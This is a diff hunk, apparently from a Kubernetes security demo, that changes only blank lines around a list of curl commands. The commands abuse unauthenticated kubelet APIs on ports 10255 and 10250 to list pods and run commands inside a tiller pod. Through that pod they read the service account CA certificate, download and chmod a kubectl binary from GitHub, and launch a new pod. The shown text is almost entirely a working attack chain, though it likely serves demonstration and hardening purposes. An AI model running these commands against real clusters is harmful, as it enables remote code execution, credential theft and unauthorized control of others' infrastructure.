@@ -27,11 +27,15 @@ kubectl apply -f docker-pod-no-master.yaml
 curl -sk http://master:10255/pods/|jq .|grep name
 
 curl -sk https://node:10250/runningpods/|jq .
+
 curl -sk https://node:10250/runningpods/|jq .|grep name
 
 curl -sk https://node:10250/run/kube-system/tiller-deploy-745ff9f9b-ggqr6/tiller -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
 
 curl -sk https://node:10250/run/kube-system/tiller-deploy-745ff9f9b-ggqr6/tiller -d "cmd=wget https://github.com/OrlinVasilev/kube-bench-demo/raw/master/kubectl"
+
 curl -sk https://node:10250/run/kube-system/tiller-deploy-745ff9f9b-ggqr6/tiller -d "cmd=chmod 777 kubectl"
+
 curl -sk https://node:10250/run/kube-system/tiller-deploy-745ff9f9b-ggqr6/tiller -d 'cmd=./kubectl get pods'
+
 curl -sk https://node:10250/run/kube-system/tiller-deploy-745ff9f9b-ggqr6/tiller -d 'cmd=./kubectl run from-kubelet-to-tiller --image postgres'
